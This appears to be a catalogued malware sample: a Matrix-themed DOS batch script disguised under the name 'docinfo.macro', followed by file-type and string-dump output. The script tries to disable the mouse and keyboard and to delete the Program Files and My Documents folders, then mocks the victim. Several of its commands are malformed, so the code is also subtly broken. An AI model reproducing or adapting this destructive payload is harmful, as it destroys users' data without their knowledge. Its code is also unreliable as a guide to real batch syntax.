docinfo.macro:
@echo off
cls
REM THE MATRIX HAS YOU......
C:\windows\rundll.exe mouse,disable
C:\windows\rundll.exe keyboard,disable
GOTO next

:next
del /y c:\Program Files
GOTO MESSAGE

:MESSAGE
COLOR BLACK
REM THE MATRIX HAS YOU.......
REM TOO BAD YOU DID NOT FOLLOW THE WHITE RABBIT, NOW YOUR PROGRAM FILES ARE GONE
REM THE ONLY PERSON THAT CAN SAVE YOU NOW.......IS "THE ONE"
GOTO last

:last
del /y c:\MyDocuments

REM NOW THE MATRIX HAS YOUR COMPUTER

filetype: DOS batch file, ASCII text, with CRLF line terminators

dump: REM TOO BAD YOU DID NOT FOLLOW THE WHITE RABBIT, NOW YOUR PROGRAM FILES ARE GONE
REM THE ONLY PERSON THAT CAN SAVE YOU NOW.......IS "THE ONE"
REM NOW THE MATRIX HAS YOUR COMPUTER
